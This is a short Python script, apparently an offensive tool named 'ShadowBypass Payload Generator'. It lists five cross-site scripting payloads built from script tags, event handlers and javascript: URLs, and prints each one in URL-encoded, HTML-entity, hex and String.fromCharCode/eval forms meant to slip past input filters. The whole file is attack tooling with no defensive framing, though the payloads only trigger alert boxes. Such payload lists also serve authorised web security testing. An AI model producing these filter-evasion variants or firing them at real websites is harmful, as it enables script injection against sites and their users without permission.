import urllib.parse

base_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<body onload=alert(1)>"
]

def encode_payloads(payload):
    return {
        "raw": payload,
        "url_encoded": urllib.parse.quote(payload),
        "html_entity": ''.join(f'&#{ord(c)};' for c in payload),
        "hex": ''.join(f'\\x{ord(c):02x}' for c in payload),
        "charcode_injection": "eval(String.fromCharCode(" + ",".join(str(ord(c)) for c in "alert('XSS')") + "))"
    }

def main():
    print("=== ShadowBypass Payload Generator ===\n")
    for i, p in enumerate(base_payloads, 1):
        print(f"[{i}] Original: {p}")
        variants = encode_payloads(p)
        for key, value in variants.items():
            print(f"    {key}: {value}")
        print("\n")

if __name__ == "__main__":
    main()
